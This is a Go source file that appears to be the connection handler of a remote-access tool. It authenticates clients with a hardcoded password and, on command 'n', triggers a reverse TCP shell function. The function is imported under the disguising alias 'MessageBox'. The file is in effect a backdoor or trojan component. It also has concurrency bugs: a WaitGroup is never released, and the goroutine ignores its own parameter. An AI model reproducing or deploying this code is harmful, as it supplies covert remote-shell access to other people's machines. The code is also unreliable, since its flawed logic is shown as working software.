package internals

import (
	MessageBox "TestRemote/Remote/Utility"
	"bufio"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

const (
	password = "Pa$$w0rd"
)

func HandleConnection(conn net.Conn, wg *sync.WaitGroup) {
	defer conn.Close()
	defer wg.Done()

	// Set a deadline for reading the password
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// Read the password from the client
	reader := bufio.NewReader(conn)
	clientPassword, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println("Error reading password:", err)
		return
	}

	// Trim spaces and check if the password is correct
	clientPassword = strings.TrimSpace(clientPassword)
	if clientPassword != password {
		fmt.Println("Invalid password.")
		return
	}

	// Authentication successful
	fmt.Println("Client connected successfully!")

	for {
		// Set a deadline for reading the input
		conn.SetDeadline(time.Now().Add(30 * time.Second))

		// Read the input from the client
		reader = bufio.NewReader(conn)
		clientInput, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			return
		}

		// Trim spaces and check the input
		clientInput = strings.TrimSpace(clientInput)

		wg.Add(1)
		go func(input string) {
			switch clientInput {
			case "m":
				fmt.Println("You press m")
				MessageBox.PrintCurrDirectoryFromCmd()
			case "n":
				fmt.Println("You press n")
				MessageBox.ReverseTcp2()
			default:
				fmt.Println("Invalid input. No API called.")
			}
		}(clientInput)

	}
}
